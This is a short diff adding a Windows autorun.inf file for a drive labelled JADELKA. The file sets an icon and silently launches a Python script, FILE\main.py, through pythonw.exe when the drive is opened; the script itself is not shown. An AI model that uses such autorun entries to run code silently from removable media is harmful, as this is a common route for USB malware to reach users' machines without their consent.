@@ -1,0 +1,4 @@
+[AutoRun]
+open=pythonw.exe FILE\main.py
+icon=IMG\Drive.ico
+label=JADELKA
